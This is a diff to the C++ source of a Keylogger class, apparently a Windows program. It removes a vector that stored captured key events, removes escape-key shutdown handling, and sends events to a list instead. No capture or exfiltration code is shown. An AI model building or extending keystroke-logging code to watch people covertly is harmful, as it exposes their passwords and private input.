@@ -20,12 +20,6 @@ Keylogger::~Keylogger()
 			std::cout << "Stop error." << std::endl;
 		}
 	}
-	for (AEvent* event : _events)
-	{
-		delete event;
-	}
-	_events.clear();
-	system("Pause");
 }
 
 
@@ -33,7 +27,6 @@ Keylogger::~Keylogger()
 * @return bool
 */
 bool Keylogger::init() {
-	_events.clear();
 	if (!_hookHandler.init())
 		return false;
 	return true;
@@ -50,6 +43,7 @@ bool Keylogger::run() {
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
+	_running = false;
 	return true;
 }
 
@@ -73,36 +67,6 @@ bool Keylogger::kill() {
 * @return bool
 */
 bool Keylogger::pushToQueue(const AEvent* event) {
-	int size = _events.size();
-	if (!event->isMouse())
-	{
-		_events.push_back(const_cast<AEvent*>(event));
-		if (_events.size() == size)
-		{
-			return false;
-		}
-		if (event->getVirtualKeyCode() == VK_ESCAPE)
-			_running = false;
-	}
-	if (event->isMouse())
-	{
-		//	((MouseEvent*)(event))->describe();
-		delete event;
-	}
-	//else
-	//{
-	//	((KeyboardEvent*)(event))->describe();
-	//	if (event->getVirtualKeyCode() == VK_ESCAPE)
-	//	{
-	//		std::cout << "VK_ESCAPE=" << VK_ESCAPE << std::endl;
-	//		this->stop();
-	//	}
-	//}
 	this->_levents.add_elem((void*)event);
 	return true;
-}
-
-std::vector<AEvent*>		Keylogger::getEvents() const
-{
-	return _events;
 }
